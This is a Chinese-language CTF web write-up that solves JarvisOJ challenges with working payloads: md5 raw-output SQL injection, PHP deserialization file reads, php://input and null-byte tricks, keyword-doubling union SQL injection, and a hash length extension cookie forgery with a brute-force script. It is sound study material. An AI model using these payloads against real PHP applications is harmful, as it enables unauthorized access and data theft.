# 对CTF-Web的记录与总结 #

### 使用本地的某个端口号对网址进行访问 ###

[例题:JarvisOJ PORT51](http://web.jarvisoj.com:32770/)

`curl 参数 --local-port RANGE  强制使用的本地端口号`

***payload***

`curl --local-port 51 http://web.jarvisoj.com:32770/`

(在做题的时候貌似出了问题 没有回显)

### php中md5($str,true)注入 ###

[例题:JarvisOJ Login](http://web.jarvisoj.com:32772/)

```
Hint: "select * from `admin` where password='".md5($pass,true)."'"
```

关键在于md5函数的第二个参数为true

- TRUE - 原始 16 字符二进制格式
- FALSE - 默认 32 字符十六进制数

例如输入为: `asdf` 时

得到md5为 `912ec803b2ce49e4a541068d495ab570` 这是false的情况

得到的16字符为 `.È²ÎIä¥AIZµp` 这是true的情况

当转换出的字符能够进行sql注入时即可提取flag

当输入为`129581926211651571912466741651878684928`或`ffifdyop`均能得到flag

```
129581926211651571912466741651878684928
md5: 06da5430449f8f6f23dfc1276f722738
ascii: ÚT0Do#ßÁ'or'8
```

```
ffifdyop
md5: 276f722736c95d99e921722cf9ed621c
ascii: 'or'6É]é!r,ùíb
```

### php反序列化 ###

[例题:JarvisOJ 神盾局的秘密](http://web.jarvisoj.com:32768/)

`<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>`

显然存在文件读取漏洞，并且文件名进行了base64加密

尝试对showimg.php进行读取，构造payload

`http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=`

得到空白页面，查看源代码

```php
<?php
	$f = $_GET['img'];
	if (!empty($f)) {
		$f = base64_decode($f);
		if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\')===FALSE
		&& stripos($f,'pctf')===FALSE) {
			readfile($f);
		} else {
			echo "File not found!";
		}
	}
?>
```

限制了对上级目录以及pctf的直接读取，尝试读取index.php，构造payload

`http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw`

查看源代码

```php
<?php 
	require_once('shield.php');
	$x = new Shield();
	isset($_GET['class']) && $g = $_GET['class'];
	if (!empty($g)) {
		$x = unserialize($g);
	}
	echo $x->readfile();
?>
```

查看shield.php源代码
```php
<?php
	//flag is in pctf.php
	class Shield {
		public $file;
		function __construct($filename = '') {
			$this -> file = $filename;
		}
		
		function readfile() {
			if (!empty($this->file) && stripos($this->file,'..')===FALSE  
			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
				return @file_get_contents($this->file);
			}
		}
	}
?>
```

利用反序列化构造payload去读取pctf.php

>对象（object）通常被序列化为：
`O:<length>:"<class name>":<n>:{<field name 1><field value 1><field name 2><field value 2>...<field name n><field value n>}`

[参考文章](http://www.neatstudio.com/show-161-1.shtml)

因此在构造payload时要写上file name 和 value

payload: `http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}`

flag在源代码中

### ereg 00截断与php伪协议 ###
[例题:JarvisOJ IN A Mess](http://web.jarvisoj.com:32780/)

提示查看 index.phps 

```php
<?php

error_reporting(0);
echo "<!--index.phps-->";

if(!$_GET['id'])
{
	header('Location: index.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'Hahahahahaha';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("flag.txt");
}
else
{
	print "work harder!harder!harder!";
}


?>
```
1. 让id==0
   
   当php进行一些数学计算的时候，有一个对比参数是整数的时候，会把另外一个参数强制转换为整数。

   ```php
   #!php
	var_dump(0 == '0'); // true
	var_dump(0 == 'abcdefg'); // true  
	var_dump(0 === 'abcdefg'); // false
	var_dump(1 == '1abcdef'); // true 
   ```
	所以让传入的id为abc即可
2. 让data=="1112 is a nice lab!"
   
   当a为php://input，data可以通过php://input来接受post数据

   所以让a=php://input 同时 post data: `1112 is a nice lab!`

   **PS:** 也可以用data类型的URL进行传递
   ```
   data:,<文本数据>
   data:text/plain,<文本数据>
   data:text/html,<HTML代码>
   data:text/html;base64,<base64编码的HTML代码>
   data:text/css,<CSS代码>
   data:text/css;base64,<base64编码的CSS代码>
   data:text/javascript,<Javascript代码>
   data:text/javascript;base64,<base64编码的Javascript代码>
   data:image/gif;base64,base64编码的gif图片数据
   data:image/png;base64,base64编码的png图片数据
   data:image/jpeg;base64,base64编码的jpeg图片数据
   data:image/x-icon;base64,base64编码的icon图片数据
   ```
   [参考文章](https://blog.csdn.net/lxgwm2008/article/details/38437875)

   此处可以让a=data:,1112 is a nice lab!

   **PPS:** 在尝试使用 php://filter/convert.base64-encode/resource 对flag.txt 进行直接读取时，发现a过滤了 `.` 无法暴力读取

3. 让b的长度大于5，同时满足eregi的要求和首字母不为4
   
   ereg存在00截断，使b=%00111111

   strlen不受00截断的影响，长度依然可以统计

   使eregi的匹配转变为(111,1114)

得到 `Come ON!!! {/^HT2mCpcvOLf}` 

`/^HT2mCpcvOLf `应该是路径，访问 `http://web.jarvisoj.com:32780/^HT2mCpcvOLf`

`http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1`

发现存在id=1，怀疑存在sql注入

输入id=2，回显`SELECT * FROM content WHERE id=2`

发现空格被过滤，union和select被替换为空，所以使用双写

确定列数，当`id=1/*123*/order/*123*/by/*123*/4`，回显改变，猜测列数为3

确定数据库名为test `id=2/*123*/uunionnion/*123*/sselectelect/*123*/1,2,database()`

确定表名为content `id=2/*123*/uunionnion/*123*/sselectelect/*123*/1,2,group_concat(table_name)/*123*/ffromrom/*123*/information_schema.tables/*123*/where/*123*/table_schema=database()`

确定列名有id,context,title `id=2/*123*/uunionnion/*123*/sselectelect/*123*/1,2,group_concat(column_name)/*123*/ffromrom/*123*/information_schema.columns/*123*/where/*123*/table_schema=database()`

查找id中的内容 `id=2/*123*/uunionnion/*123*/sselectelect/*123*/1,2,id/*123*/ffromrom/*123*/content`
返回1

查找context中的内容 `id=2/*123*/uunionnion/*123*/sselectelect/*123*/1,2,context/*123*/ffromrom/*123*/content`
返回flag

查找title中的内容 `id=2/*123*/uunionnion/*123*/sselectelect/*123*/1,2,title/*123*/ffromrom/*123*/content`
返回hi666

### hash长度拓展攻击 ###
[例题:JarvisOJ flag在管理员手里](http://web.jarvisoj.com:32778/)

打开网页，发现`Only Admin can see the flag!!`

在burpsuite中发现

`Cookie	role s:5:"guest"`

`Cookie	hsah 3a4727d57463f122833d9e732f94e4e0"`

猜测跟hash有关，无其他发现，尝试暴力扫描

在御剑中发现了index.php的vim swap file

通过`vim -r index.php.swp`将其还原

```php
<!DOCTYPE html>
<html>
<head>
<title>Web 350</title>
<style type="text/css">
   body {
      background:gray;
      text-align:center;
   }
</style>
</head>

<body>
   <?php
      $auth = false;
      $role = "guest";
      $salt =
      if (isset($_COOKIE["role"])) {
         $role = unserialize($_COOKIE["role"]);
         $hsh = $_COOKIE["hsh"];
         if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {
            $auth = true;
         } else {
            $auth = false;
         }
      } else {
         $s = serialize($role);
         setcookie('role',$s);
         $hsh = md5($salt.strrev($s));
         setcookie('hsh',$hsh);
      }
      if ($auth) {
         echo "<h3>Welcome Admin. Your flag is 
      } else {
         echo "<h3>Only Admin can see the flag!!</h3>";
      }
   ?>
```

关键在于`$role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"])`

现在知道md5(salt+;”tseug”:5:s)，需要计算md5(salt+;”nimda”:5:s)。因此可以用[哈希长度扩展攻击](https://www.smi1e.top/hello-world/)。即可以计算出md5(salt+;”tseug”:5:s+填充的字节+;”nimda”:5:s)，倒序后的role值是s:5:”admin”;+逆序的填充字节+s:5:”guest”;。php在反序列化时会忽略第一个可序列化后对象之后的字符串。

```php
$array1 = array('a' => 1);
$array2 = array('b' => 'test');
$s = serialize($array1)."pad".serialize($array2);
print_r($s);
print_r(unserialize($s));
```

```php
a:1:{s:1:"a";i:1;}pada:1:{s:1:"b";s:4:"test";}
Array
(
    [a] => 1
)
```

注意要将`\x`转换为`%`，同时`;`要转换为`%3b`。此时尚不清楚salt的长度，假设为10，使用hashpump进行尝试

```
Input Signature: 3a4727d57463f122833d9e732f94e4e0
Input Data: ;"tseug":5:s
Input Key Length: 10
Input Data to Add: ;"nimda":5:s
fcdc3840332555511c4e4323f6decb07
;"tseug":5:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb0\x00\x00\x00\x00\x00\x00\x00;"nimda":5:s
```

当长度为12时得到flag

```
Input Signature: 3a4727d57463f122833d9e732f94e4e0
Input Data: ;"tseug":5:s
Input Key Length: 12
Input Data to Add: ;"nimda":5:s
fcdc3840332555511c4e4323f6decb07
;"tseug":5:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00;"nimda":5:s
```

此时的payload为 `role=s:5:"admin"%3b%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s:5:"guest"%3b; hsh=fcdc3840332555511c4e4323f6decb07`

另一种方法为使用[爆破脚本](https://skysec.top/2017/08/16/jarvisoj-web/#flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98%E6%89%8B%E9%87%8C)
```python
# -*- coding:utf-8 -*-
from urlparse import urlparse
from httplib import HTTPConnection
from urllib import urlencode
import json
import time
import os
import urllib

def gao(x, y):
        #print x
        #print y
    url = "http://web.jarvisoj.com:32778/index.php"
    cookie = "role=" + x + "; hsh=" + y
        #print cookie
    build_header = {
            'Cookie': cookie,
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0',
            'Host': 'web.jarvisoj.com:32778',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    }
    urlparts = urlparse(url)
    conn = HTTPConnection(urlparts.hostname, urlparts.port or 80)
    conn.request("GET", urlparts.path, '', build_header)
    resp = conn.getresponse()
    body = resp.read()
    return body

for i in xrange(1000):
    print i
    # secret len = ???
    find_hash = "./hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ';\"nimda\":5:s' --out-data-format=html -l " + str(i) + " --quiet"
    #print find_hash
    calc_res = os.popen(find_hash).readlines()
    hash_value = calc_res[0][:32]
    attack_padding = calc_res[0][32:]
    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1])
    ret = gao(attack_padding, hash_value)
    if "Welcome" in ret:
        print ret
        break
```